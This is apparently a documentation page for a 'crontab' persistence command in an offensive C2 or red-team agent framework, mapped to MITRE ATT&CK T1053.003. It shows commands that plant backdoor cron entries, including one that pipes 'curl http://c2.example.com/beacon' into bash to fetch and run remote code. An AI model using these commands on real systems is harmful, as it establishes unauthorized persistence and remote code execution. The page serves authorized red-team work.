+++
title = "crontab"
chapter = false
weight = 28
hidden = false
+++

{{% notice info %}}Linux/macOS Only{{% /notice %}}

## Summary

List, add, or remove cron jobs for scheduled persistence. Supports raw cron entries or a simplified program+schedule syntax. Default schedule is `@reboot` for persistence on system restart.

### Arguments

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| action | choose_one | Yes | list | `list`, `add`, or `remove` |
| entry | string | No | - | Raw cron entry (e.g., `*/5 * * * * /path/to/agent`). For remove, substring to match. |
| program | string | No | - | Path to program (alternative to raw entry — combined with schedule) |
| args | string | No | - | Arguments for the program |
| schedule | string | No | @reboot | Cron schedule (e.g., `@reboot`, `*/5 * * * *`, `0 0 * * *`) |
| user | string | No | current | Target user for crontab operations (requires privileges) |

## Usage

### List Current Cron Jobs

```
crontab -action list
```

List another user's crontab (requires root):
```
crontab -action list -user www-data
```

### Add Persistence Entry

Add an @reboot persistence entry (default schedule):
```
crontab -action add -program /tmp/agent
```

Add with custom schedule (every 5 minutes):
```
crontab -action add -program /opt/backdoor -schedule "*/5 * * * *"
```

Add a raw cron entry:
```
crontab -action add -entry "0 */6 * * * /usr/bin/curl http://c2.example.com/beacon | bash"
```

### Remove an Entry

Remove by matching substring:
```
crontab -action remove -entry "/tmp/agent"
```

Remove by program path:
```
crontab -action remove -program "/opt/backdoor"
```

### Example Output

```
Current crontab:
@reboot /tmp/agent
*/5 * * * * /opt/backdoor
```

## MITRE ATT&CK Mapping

- T1053.003 — Scheduled Task/Job: Cron
